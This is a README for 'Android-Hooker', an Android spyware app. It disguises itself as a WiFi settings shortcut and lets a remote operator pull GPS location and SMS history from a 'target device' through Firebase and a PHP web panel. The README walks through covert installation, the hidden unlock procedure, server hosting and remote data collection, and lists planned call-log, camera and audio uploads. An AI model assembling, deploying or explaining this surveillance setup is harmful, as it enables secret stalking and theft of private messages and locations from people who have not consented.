# Android-Hooker
Get GPS Location, Read SMS, Take Photo's and Read the Call Logs of an Android Device.   
   
## Firebase Setup    
- Setup a project in Google Firebase
- Grab your google-services.json
- Place your json file into the build directory
- Build the application


## Server Setup   
- Grab the PHP Frontend Files
- Upload to a hosting provider, ByteHost or 000WebHost for free examples


## Launching Application    
### By default, the application will launch into WiFi Settings and masquerade as a simple settings shortcut, you need to follow the special launching procedure to access the applications hidden settings menu.  

- Install the application on your target device
- Open Unlock.com with your browser
- Click on "Apply Today!"
- You'll get an option to open yhe application with either your browser or with Hooker
- Select Hooker as the application to launch
    

## Setup The Web Hook
- Enter your Hook.php url into the application
- Enter your unique name for the target device 
- Click on Get Token ( Your Firebase Key/Token will be sent to the hook.php script )


## Access And Control the Device using your front-end    
- Open the Hooker Website where you uploaded it
- Select Linked Device's
- Select your device
- Choose either GET SMS or GET Location
- Wait while the application sends a firebase message to the device and requests a location or sms history to be uploaded
- View the GPS Location or the SMS History


## To-Do   
### This application is still a work in-progress and needs further features added, possibly a login and user control feature for the website.
- Enable Call History Uploads
- Enable Camera Photo Uploads
- Enable Audio Uploads

    
